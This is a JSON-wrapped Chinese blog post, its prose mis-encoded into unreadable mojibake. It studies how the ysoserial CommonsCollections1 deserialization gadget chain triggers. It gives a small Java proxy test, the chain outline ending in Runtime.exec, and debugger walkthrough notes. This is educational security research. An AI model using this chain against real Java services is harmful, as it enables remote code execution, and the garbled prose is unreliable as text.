protected çš„ï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªä»£ç†å¯¹è±¡æ—¶éœ€è¦æ‰¾åˆ°å¦ä¸€ä¸ªå¯ä»¥è¿”å›å®ä¾‹çš„æ–¹æ³•</p>\n<p>é‚£å°±æ˜¯ newProxyInstance æ–¹æ³•å•¦</p>\n<p><img src=\"64.png\" alt=\"\"></p>\n<p>æ¥æµ‹è¯•è¯•è¯•</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * My Test Class</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        TestInvocationHandler handler = <span class=\"keyword\">new</span> TestInvocationHandler();</span><br><span class=\"line\">        Map testProxy = (Map) Proxy.newProxyInstance(Gadgets.class.getClassLoader(), <span class=\"keyword\">new</span> Class[]&#123;Map.class&#125;, handler);</span><br><span class=\"line\">        testProxy.put(<span class=\"string\">&quot;key&quot;</span>,<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestInvocationHandler</span> <span class=\"keyword\">implements</span> <span class=\"title\">InvocationHandler</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">invoke</span><span class=\"params\">(Object proxy, Method method, Object[] args)</span> <span class=\"keyword\">throws</span> Throwable </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;method: &quot;</span> + method.toString());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>debug ä»£ç ï¼Œå¯ä»¥çœ‹è§å½“è°ƒç”¨ Map#put æ—¶ï¼Œä¼šè¿›å…¥ TestInvocationHandler#invoke</p>\n<p><img src=\"65.png\" alt=\"\"></p>\n<p>æ²¡æˆ³ proxy åˆ©ç”¨åˆ°çš„ç‚¹å°±è¿™ä¸€ä¸ªå•¦</p>\n<h3 id=\"è°ƒè¯•\"><a class=\"markdownIt-Anchor\" href=\"#è°ƒè¯•\">#</a> è°ƒè¯•</h3>\n<p>æ¯”è¾ƒç»•çš„åœ°æ–¹è°ƒè¯•ä¸€æ³¢</p>\n<p><img src=\"36.png\" alt=\"\"></p>\n<p>è¿›å…¥è¯¥å‡½æ•°ï¼Œå‘ç°æœ‰ä¸¤å¤„å‡½æ•°è®¡ç®—</p>\n<p><img src=\"37.png\" alt=\"\"></p>\n<p>è¿›å…¥ <code>createMemoizedInvocationHandler(map)</code></p>\n<p>å…¶ä¸­ <code>ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</code></p>\n<p>å¯ä»¥çœ‹å‡ºæ­¤å¤„æ˜¯é€šè¿‡åå°„è·å– AnnotationInvocationHandler å¯¹è±¡ï¼Œä¸”è·å–å¯¹è±¡æ—¶ä¼ å…¥äº†æ„é€ çš„ LazyMap</p>\n<p><img src=\"38.png\" alt=\"\"></p>\n<p>è¿›å…¥ <code>createProxy(handler,iface,ifaces)</code></p>\n<p>å¯¹ä¼ å…¥çš„ iface è¿›è¡Œä»£ç†ï¼Œå¹¶ä¼ å…¥ä¸Šä¸€æ­¥è·å¾—çš„ AnnotationInvocationHandler å¯¹è±¡ handler2</p>\n<p>iface ä¸ºä¼ å…¥çš„ Map.class (CommonsCollections1.java ä¸­ï¼š <code>mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</code> ï¼‰</p>\n<p><img src=\"39.png\" alt=\"\"></p>\n<p>ä¸¤æ¬¡å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œè¿”å› CommonsCollections1</p>\n<p>è¿”å›ä»£ç†å¯¹è±¡ mapProxyï¼ˆè°ƒç”¨è¯¥å¯¹è±¡ä»»æ„æ–¹æ³•ï¼Œéƒ½ä¼šå…ˆè°ƒç”¨ä¼ å…¥çš„ handler#invokeï¼‰</p>\n<p>73 è¡Œä»£ç å°†è·å–åˆ°çš„ mapProxy è¿›è¡ŒåŒ…è£¹æ˜¯å› ä¸ºï¼š</p>\n<p>â€‹\tç”±äºååºåˆ—åŒ–å…¥å£ä¸º readObjectï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŸä¸ªç±»çš„ readObject ä¸­ä¼šè°ƒç”¨ä¼ å…¥ map çš„ä»»æ„æ–¹æ³•</p>\n<p>â€‹\tAnnotationInvocationHandler#readObject ä¸­æœ‰è°ƒç”¨ map.entrySet ()</p>\n<p>â€‹\tä»è€Œè§¦å‘ AnnotationInvocationHandler#invoke</p>\n<p><img src=\"40.png\" alt=\"\"></p>\n<p>æœ€åè¿”å›å±‚å±‚æ„é€ å¥½çš„ï¼Œè¿˜æ²¡æœ‰åºåˆ—åŒ–çš„ï¼Œpayload å•¦</p>\n<h2 id=\"payloadè§¦å‘åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#payloadè§¦å‘åˆ†æ\">#</a> payload è§¦å‘åˆ†æ</h2>\n<p>ä»¥ä¸‹æ˜¯ POC ä¸­ç»™å‡ºçš„è§¦å‘é“¾ï¼Œå¯ä»¥æ ¹æ® Gadget ä¸‹æ–­ç‚¹ï¼ˆè¿™æ ·æ¯”è¾ƒæ¸…æ™°æ„Ÿè§‰ï¼‰</p>\n<p>æ ¹æ®ä¸Šé¢ payload æ„é€ çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å¯ä»¥æ›´å¥½çš„ç†è§£è¯¥åˆ©ç”¨é“¾çš„è§¦å‘</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\tGadget chain:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tObjectInputStream.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tAnnotationInvocationHandler.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\tMap(Proxy).entrySet()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tAnnotationInvocationHandler.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\tLazyMap.get()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\tChainedTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tConstantTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tClass.getMethod()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.exec()</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tRequires:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tcommons-collections</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br></pre></td></tr></table></figure>\n<p>é¦–å…ˆä» PayloadRunner38 è¡Œè¿›å…¥ååºåˆ—åŒ–</p>\n<p>å…¶ä¸­ serialized æ˜¯æˆ‘ä»¬åºåˆ—åŒ–åçš„ payload</p>\n<p><img src=\"41.png\" alt=\"\"></p>\n<p>è¿›å…¥ ObjectInputStream#readObject</p>\n<p><img src=\"42.png\" alt=\"\"></p>\n<p>åœ¨ AnnotationInvocationHandler#readObject å¤„ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹è°ƒç”¨æ ˆ</p>\n<p>è§‚å¯Ÿåˆ°åœ¨ ObjectInputStream ä¸­é€šè¿‡åå°„è°ƒç”¨äº† AnnotationInvocationHandler#readObject</p>\n<p><img src=\"43.png\" alt=\"\"></p>\n<p>è¿›å…¥ AnnotationInvocationHandler#readObject</p>\n<p>æ­¤å¤„ memberValues ä¸ºæˆ‘ä»¬ä¼ å…¥çš„ä»£ç†å¯¹è±¡ proxyMap</p>\n<p><img src=\"45.png\" alt=\"\"></p>\n<p>è°ƒç”¨å…¶ä»»æ„æ–¹æ³•ï¼Œå°±ä¼šè¿›å…¥ AnnotationInvocationHandler#invoke</p>\n<p>è¿™é‡Œè¦è¿›å…¥å‡½æ•°ä¸€ç›´ç‚¹ç‚¹ç‚¹ï¼Œå…¶ä¸­ä¼šå¤šæ¬¡è¿”å›è¯¥è¡Œ</p>\n<p><img src=\"46.png\" alt=\"\"></p>\n<p>ç›´åˆ°å†æ¬¡è¿›å…¥ AnnotationInvocationHandler#readObjectï¼Œè¿è¡Œè‡³ 355 è¡Œè¿›å…¥å‡½æ•°ï¼Œä¼šè·³è½¬è‡³ AnnotationInvocationHandler#invoke</p>\n<p><img src=\"47.png\" alt=\"\"></p>\n<p>æŸ¥çœ‹å½“å‰å‡½æ•°è°ƒç”¨æ ˆ</p>\n<p>handler1 çš„ readObject -&gt; ä»£ç†å¯¹è±¡çš„ entrySet -&gt; handler2 çš„ invoke</p>\n<p><img src=\"48.png\" alt=\"\"></p>\n<p>æ„é€  handler2 æ—¶ï¼Œä¼ å…¥çš„ Map å¯¹è±¡å°±æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„ LazyMap</p>\n<p>æ­¤æ—¶åªè¦æœ‰è°ƒç”¨ LazyMap#getï¼Œå°±ä¼šæ‰§è¡Œ transform</p>\n<p>æŸ¥çœ‹å½“å‰å˜é‡ï¼Œthis.memberValues å°±æ˜¯ LazyMap å¯¹è±¡</p>\n<p><img src=\"49.png\" alt=\"\"></p>\n<p>å¾€ä¸‹æ»‘æ»‘æ»‘æ»‘æ»‘</p>\n<p>åœ¨ 78 è¡Œæ‰¾åˆ° <code>this.memberValues.get(var4)</code>  å•¦</p>\n<p><img src=\"50.png\" alt=\"\"></p>\n<p>è°ƒè¯•è¿›å…¥ LazyMap#getï¼Œå…¶ä¸­å½“è·å–çš„ key ä¸å­˜åœ¨æ—¶ï¼Œä¼šè¿›å…¥ if ä»£ç å—è°ƒç”¨æˆ‘ä»¬æ„é€ å¥½çš„ transform</p>\n<p><img src=\"51.png\" alt=\"\"></p>\n<p>æŸ¥çœ‹å˜é‡ï¼Œæ‰§è¡Œçš„ transform å°±æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„ï¼Œä¼šé€šè¿‡åå°„è·å–å‡½æ•°æ‰§è¡Œå‘½ä»¤</p>\n<p><img src=\"53.png\" alt=\"\"></p>\n<p>æŸ¥çœ‹å‡½æ•°è°ƒç”¨æ ˆï¼Œå’Œåˆ†æä¸­ç›¸åŒ</p>\n<p><img src=\"52.png\" alt=\"\"></p>\n<p>è°ƒåˆ°è¿™é‡Œå°±å®Œæˆè§¦å‘å•¦:happy:</p>\n<p>â­ç¢°è§äº†å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ï¼Œæ¯”å¦‚æ ¹æœ¬ä¸ä¼šè·³è¿› LazyMap#get ä¸­ if ä¸­çš„ä»£ç å—ï¼Œæˆ–è€…è¿˜æ²¡åˆ°è¿™å°±å·²ç»å¼¹çª—äº†ï¼Œæˆ–è€…ç»†è°ƒæ—¶æ ¹æœ¬ä¸ä¼šå¼¹çª—â€¦ å›°æ‰°äº†æˆ‘å¾ˆä¹…ğŸ˜ª</p>\n<p>ä½†æ˜¯æ­£å¸¸è¿è¡Œæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œæ‰€ä»¥æˆ‘å–æ¶ˆäº†æ‰€æœ‰é™¤æ­¤ä¹‹å¤–çš„æ–­ç‚¹ï¼ŒæŸ¥çœ‹å‡½æ•°è°ƒç”¨æ ˆå’Œå˜é‡éƒ½ OK äº†</p>\n<p>æ‰€ä»¥æ„Ÿè§‰åº”è¯¥æ˜¯ debug åœ¨å®ç°è‡ªèº«åŠŸèƒ½æ—¶æœ‰å½±å“åˆ°æ­£å¸¸ä»£ç çš„è§¦å‘ï¼Œè¿™é‡Œè¯´æ˜ä¸€ä¸‹å•¦</p>\n<h1 id=\"å“”å“”å“”å£æ°´æ€»ç»“\"><a class=\"markdownIt-Anchor\" href=\"#å“”å“”å“”å£æ°´æ€»ç»“\">#</a> å“”å“”å“”å£æ°´æ€»ç»“</h1>\n<p>çœ‹ p ç¥çš„æ–‡ç« ï¼Œä¸€ç‚¹ä¸€ç‚¹ä»”ç»†çœ‹äº†ä¸€é</p>\n<p><img src=\"54.png\" alt=\"\"></p>\n<p>ç„¶åè„‘è¢‹ç“œå­å°±ç³Šäº†</p>\n<p><img src=\"55.jpg\" alt=\"\"></p>\n<p>ç„¶åå°±ä» URLDNS å¼€å§‹å†çœ‹ä¸€é</p>\n<p>ç„¶åå‘ç°å“‡å¡</p>\n<p>URLDNS çœŸçš„å¥½ç®€å•è€¶</p>\n<p>æ€ä¹ˆä¼šæœ‰äººçœ‹ä¸æ‡‚è¿™ä¹ˆç®€å•çš„åŸç†å‘€ä¸ä¼šæŠŠä¸ä¼šå§</p>\n<p><img src=\"57.jpg\" alt=\"\"></p>\n<p>ç„¶åçœ‹ cc1ï¼ŒæŠŠ payload åŸç†åˆçœ‹äº†ä¸€éï¼Œä»€ä¹ˆ transform ä¹Ÿå¤ªç®€å•äº†æŠŠï¼Œä¸å°±æ˜¯è¿™æ ·å—ï¼Œè¿™æœ‰ä»€ä¹ˆéš¾åº¦å—ï¼Ÿï¼Ÿï¼Ÿ</p>\n<p><img src=\"58.jpg\" alt=\"\"></p>\n<p>ç„¶åçœ‹è§¦å‘åŸç†è°ƒè¯•çš„æ—¶å€™å°±æ˜¯è¿™æ ·äº† (beiwei)</p>\n<p><img src=\"59.png\" alt=\"\"></p>\n<p>ç”±å…¶æ˜¯è¿˜ç¢°è§äº†è°ƒè¯•ä¸Šçš„é—®é¢˜</p>\n<p>å·¦å·¦å³å³è°ƒè¯•äº†ä¸€ä¸¤ä¸ªæ˜ŸæœŸæŠŠ</p>\n<p><img src=\"60.jpeg\" alt=\"\"></p>\n<p>ä¸€ç›´æƒ³æŠŠæ•´ä¸ªè¿‡ç¨‹ç®€æ´ä¼˜é›…çš„æ€»ç»“å‡ºæ¥ï¼Œæ‰€ä»¥ä¸æ–­åœ°æ€»ç»“æ€»ç»“ï¼Œç”»å›¾è®°ç¬”è®°â€¦</p>\n<p>å› ä¸ºèƒ½ç®€å•çš„æŠŠé—®é¢˜è§£é‡Šæ¸…æ¥šæ‰èƒ½è¯æ˜è‡ªå·±æ˜¯çœŸçš„ç†è§£äº†ï¼ˆä¸ç„¶å°±å’Œç¬¬ä¸€éçœ‹ p å¤§æ–‡ç« çš„æƒ…å†µä¸€æ ·äº†ï¼‰</p>\n<p>ç„¶åè°ƒå®Œäº†ç†è§£äº†æ€»ç»“äº†è®°ç¬”è®°äº†ï¼Œæˆ‘åˆè¡Œäº†</p>\n<p><img src=\"58.jpg\" alt=\"\"></p>\n<p>è¿™ä¹Ÿå¤ªç®€å•äº†å§</p>\n<p>ä¸ä¼šå§ä¸ä¼šå§ä¼šéš¾é“è¿˜æœ‰äººçœ‹ä¸æ‡‚ cc1 å—</p>\n<p>ä»¥ä¸Šä½œæ­»çš„è¡Œä¸ºåªæ˜¯æƒ³æé†’è‡ªå·±ï¼Œå¾ˆå¤šå¾ˆéš¾çš„çŸ¥è¯†ç‚¹ä¸€å®šè¦è‡ªå·±åŠ¨æ‰‹å»è¯•ï¼Œå¤šæ€»ç»“ï¼Œä¸€å®šè¦å†™æ–‡ç« è®°å½•ä¸‹æ¥ï¼ˆå¹´çºªå¤§äº†çœŸçš„ä¼šå¿˜çš„ï¼‰ï¼Œç»†èŠ‚ä¸è¦æ”¾è¿‡ï¼Œä¸€ç‚¹ä¸€ç‚¹æŠ </p>\n<p>æˆ‘çœŸçš„ä¸æ˜¯å°å¤©æ‰ï¼Œæˆ‘åªæ˜¯ä¸ªå°ç¥ä»™ç½¢äº†ï¼Œå”‰</p>\n<p><img src=\"61.gif\" alt=\"\"></p>\n<p>ä¸‹å›¾æ˜¯åœ¨ç†è§£è§¦å‘åŸç†æ—¶è‡ªå·±å†™çš„ä¸€ä¸ªå¤§æ¦‚çš„æµç¨‹ï¼ˆå°½é‡ç®€æ´ä½†æ˜¯ä¸æ˜¯å¾ˆç®€æ´ï¼‰</p>\n<p>çœ‹ä¸çœ‹å¾—æ‡‚å°±çœ‹ç¼˜åˆ†äº†ğŸ˜´</p>\n<p><img src=\"60.png\" alt=\"\"></p>\n",
            "tags": [
                "Javaååºåˆ—åŒ–"
            ]
        }
    ]
}